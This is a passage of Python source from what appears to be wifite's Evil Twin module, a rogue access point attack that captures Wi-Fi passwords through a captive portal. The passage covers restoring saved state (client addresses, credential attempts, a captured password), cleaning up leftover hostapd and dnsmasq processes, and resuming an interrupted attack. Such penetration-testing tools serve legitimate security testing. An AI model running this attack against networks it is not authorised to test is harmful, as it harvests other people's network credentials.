        """
        Restore attack state from session.
        
        Args:
            state: EvilTwinAttackState to restore
            
        Returns:
            True if state was restored successfully, False otherwise
        """
        try:
            
            # Restore configuration
            self.interface_ap = state.interface_ap or self.interface_ap
            self.interface_deauth = state.interface_deauth or self.interface_deauth
            
            # Restore timing information
            self.start_time = state.start_time
            self.setup_time = state.setup_time
            
            # Restore client connections
            self.clients_connected = []
            for client_state in state.clients:
                # Convert back to ClientConnection if client_monitor is available
                if self.client_monitor:
                    from ..util.client_monitor import ClientConnection
                    client = ClientConnection(
                        mac_address=client_state.mac_address,
                        ip_address=client_state.ip_address,
                        hostname=client_state.hostname,
                        connect_time=client_state.connect_time,
                        disconnect_time=client_state.disconnect_time,
                        credential_submitted=client_state.credential_submitted,
                        credential_valid=client_state.credential_valid
                    )
                    self.clients_connected.append(client)
            
            # Restore credential attempts
            self.credential_attempts = []
            for attempt_state in state.credential_attempts:
                attempt = {
                    'mac': attempt_state.mac_address,
                    'password': attempt_state.password,
                    'success': attempt_state.success,
                    'timestamp': attempt_state.timestamp
                }
                self.credential_attempts.append(attempt)
            
            # Restore result if attack was successful
            if state.captured_password:
                self.crack_result = self.create_result(
                    password=state.captured_password,
                    validation_time=state.validation_time
                )
                self.crack_result.clients_connected = state.total_clients_connected
                self.crack_result.credential_attempts = state.total_credential_attempts
                self.success = True
            
            log_info('EvilTwin', f'Restored attack state: {len(state.clients)} clients, {len(state.credential_attempts)} attempts')
            return True
            
        except Exception as e:
            log_error('EvilTwin', f'Failed to restore state: {e}', e)
            return False
    
    @staticmethod
    def is_attack_running() -> bool:
        """
        Check if another Evil Twin attack is currently running.
        
        Returns:
            True if an attack is running, False otherwise
        """

        try:
            # Check for hostapd processes with wifite config
            result = Process.run_simple(['pgrep', '-f', 'hostapd.*wifite'])

            if result.returncode == 0 and result.stdout.strip():
                log_warning('EvilTwin', 'Detected running Evil Twin attack (hostapd process found)')
                return True

            # Check for dnsmasq processes with wifite config
            result = Process.run_simple(['pgrep', '-f', 'dnsmasq.*wifite'])

            if result.returncode == 0 and result.stdout.strip():
                log_warning('EvilTwin', 'Detected running Evil Twin attack (dnsmasq process found)')
                return True

            return False

        except Exception as e:
            log_debug('EvilTwin', f'Error checking for running attack: {e}')
            return False
    
    def cleanup_orphaned_processes(self) -> None:
        """
        Clean up any orphaned processes from previous Evil Twin attacks.
        
        This method checks for and terminates any hostapd, dnsmasq, or
        other processes that may have been left running from a previous
        interrupted attack.
        """

        log_info('EvilTwin', 'Checking for orphaned processes')

        processes_to_kill = []

        try:
            # Check for hostapd processes
            result = Process.run_simple(['pgrep', '-f', 'hostapd.*wifite'])
            if result.returncode == 0 and result.stdout.strip():
                pids = result.stdout.strip().split('\n')
                processes_to_kill.extend([('hostapd', pid) for pid in pids])
        except Exception as e:
            log_debug('EvilTwin', f'Error checking for hostapd processes: {e}')

        try:
            # Check for dnsmasq processes
            result = Process.run_simple(['pgrep', '-f', 'dnsmasq.*wifite'])
            if result.returncode == 0 and result.stdout.strip():
                pids = result.stdout.strip().split('\n')
                processes_to_kill.extend([('dnsmasq', pid) for pid in pids])
        except Exception as e:
            log_debug('EvilTwin', f'Error checking for dnsmasq processes: {e}')

        try:
            # Check for Python HTTP server processes (captive portal)
            result = Process.run_simple(['pgrep', '-f', 'python.*portal.*server'])
            if result.returncode == 0 and result.stdout.strip():
                pids = result.stdout.strip().split('\n')
                processes_to_kill.extend([('portal', pid) for pid in pids])
        except Exception as e:
            log_debug('EvilTwin', f'Error checking for portal processes: {e}')

        # Kill orphaned processes
        if processes_to_kill:
            Color.pl('{!} {O}Found %d orphaned process(es) from previous attack{W}' % len(processes_to_kill))
            log_warning('EvilTwin', f'Found {len(processes_to_kill)} orphaned processes')

            for process_name, pid in processes_to_kill:
                try:
                    if not re.match(r'^\d+$', str(pid)):
                        log_warning('EvilTwin', f'Skipping kill: invalid PID value: {pid!r}')
                        continue
                    os.kill(int(pid), signal.SIGKILL)
                    log_info('EvilTwin', f'Killed orphaned {process_name} process (PID: {pid})')
                    Color.pl('{+} {C}Killed orphaned {W}%s{C} process (PID: {W}%s{C}){W}' % (process_name, pid))
                except Exception as e:
                    log_warning('EvilTwin', f'Failed to kill {process_name} process {pid}: {e}')
        else:
            log_info('EvilTwin', 'No orphaned processes found')
    
    def can_resume_from_state(self, state: 'EvilTwinAttackState') -> bool:
        """
        Check if attack can be resumed from the given state.
        
        Args:
            state: EvilTwinAttackState to check
            
        Returns:
            True if attack can be resumed, False otherwise
        """
        # Can't resume if attack was already completed successfully
        if state.captured_password:
            log_info('EvilTwin', 'Attack already completed successfully, cannot resume')
            return False
        
        # Can't resume if attack phase is failed or completed
        if state.attack_phase in ['completed', 'failed']:
            log_info('EvilTwin', f'Attack phase is {state.attack_phase}, cannot resume')
            return False
        
        # Check if interfaces are still available
        if state.interface_ap:
            try:
                result = Process.run_simple(['iw', 'dev'])
                if state.interface_ap not in result.stdout:
                    log_warning('EvilTwin', f'Interface {state.interface_ap} not available')
                    Color.pl('{!} {O}Warning: Original interface {R}%s{O} not available{W}' % state.interface_ap)
                    return False
            except Exception as e:
                log_warning('EvilTwin', f'Failed to check interface availability: {e}')
                return False
        
        return True
    
    def resume_from_session(self, state: 'EvilTwinAttackState') -> bool:
        """
        Resume Evil Twin attack from saved session state.
        
        This method:
        1. Cleans up any orphaned processes
        2. Restores attack configuration
        3. Restores client and credential data
        4. Continues the attack from where it left off
        
        Args:
            state: EvilTwinAttackState to resume from
            
        Returns:
            True if resume was successful, False otherwise
        """
        try:
            log_info('EvilTwin', 'Resuming Evil Twin attack from session')
            Color.pl('{+} {C}Resuming Evil Twin attack...{W}')
            
            # Check if we can resume
            if not self.can_resume_from_state(state):
                Color.pl('{!} {R}Cannot resume attack from saved state{W}')
                return False
            
            # Clean up orphaned processes first
            self.cleanup_orphaned_processes()
            
            # Restore state
            if not self.restore_state_from_session(state):
                Color.pl('{!} {R}Failed to restore attack state{W}')
                return False
            
            # Display resume information
            Color.pl('{+} {G}Restored attack state:{W}')
            Color.pl('    {C}Clients connected:{W} {G}%d{W}' % state.total_clients_connected)
            Color.pl('    {C}Credential attempts:{W} {G}%d{W}' % state.total_credential_attempts)
            
            if state.start_time:
                elapsed = time.time() - state.start_time
                Color.pl('    {C}Previous duration:{W} {G}%.1fs{W}' % elapsed)
            
            # Note: The actual attack restart will be handled by the run() method
            # This method just prepares the state for resumption
            
            log_info('EvilTwin', 'Attack state restored, ready to resume')
            return True
            
        except Exception as e:
            log_error('EvilTwin', f'Failed to resume attack: {e}', e)
            Color.pl('{!} {R}Failed to resume attack:{W} %s' % str(e))
            return False
